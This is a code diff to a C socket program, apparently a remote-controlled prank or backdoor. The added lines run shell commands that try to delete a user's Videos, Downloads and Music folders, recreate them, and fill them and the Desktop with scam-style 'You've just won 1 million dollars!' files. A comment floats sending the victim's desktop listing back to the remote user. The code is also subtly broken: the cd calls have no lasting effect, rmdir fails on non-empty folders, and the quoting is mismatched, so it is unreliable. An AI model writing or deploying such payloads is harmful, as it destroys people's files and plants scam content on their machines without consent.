@@ -60,20 +60,74 @@ int main(int argc, char *argv[]) {
   }
 
   //Step 2B: Set up for system call
-  
 
   // Step 2C: System call
-  //system(command);
+
+  //Changes current directory to computer
+  strcpy(command,"cd");
+  system(command);
+  
+  //Remove Videos, Downloads, and Music directories and all contents in them
+  strcpy(command,"cd");
+  system(command);
+  strcpy(command,"rmdir Videos");
+  system(command);
+  strcpy(command,"rmdir Downloads");
+  system(command);
+  strcpy(command,"rmdir Music");
+  system(command);
+
+  //Recreate the deleted directories to place our own files into them
+  strcpy(command,"mkdir Videos");
+  system(command);
+  strcpy(command,"mkdir Downloads");
+  system(command);
+  strcpy(command,"mkdir Music");
+  system(command);
+
+  //Place spam Files into the directories
+  strcpy(command,"cd Videos");
+  system(command);
+  strcpy(command,"echo 'You've just won 1 million dollars!' > congrats.txt");
+  system(command);
+  strcpy(command,"echo 'Click Here to claim your prize!' > winner.txt");
+  system(command);
 
 
+  //Return to computer then put things into music directory
+  strcpy(command,"cd");
+  system(command);
+  strcpy(command,"cd Music");
+  system(command);
+  strcpy(command,"echo 'You've just won 1 million dollars!' > congrats.txt");
+  system(command);
+  strcpy(command,"echo 'Click Here to claim your prize!' > winner.txt)");
+  system(command);
 
+  //Return to computer then put things into Downloads directory
+  strcpy(command,"cd");
+  system(command);
+  strcpy(command,"cd Downloads");
+  system(command);
+  strcpy(command,"echo 'You've just won 1 million dollars!' > congrats.txt");
+  system(command);
+  strcpy(command,"echo 'Click Here to claim your prize!' > winner.txt");
+  system(command);
+
+  //Place a couple of junk files on their desktop too
+  strcpy(command,"cd");
+  system(command);
+  strcpy(command,"cd Desktop");
+  system(command);
+  strcpy(command,"echo 'You've just won 1 million dollars!' > congrats.txt");
+  system(command);
+  strcpy(command,"echo 'Click Here to claim your prize!' > winner.txt");
+  system(command);
 // Step 3: Return results to remote user?
-
+  //Maybe use system(ls -l) and return the information of files from their desktop?  just an option
 
 // Step 4: Teardown
   close(remoteSock);
   close(hostSock);
   return 0;
 }
-
-
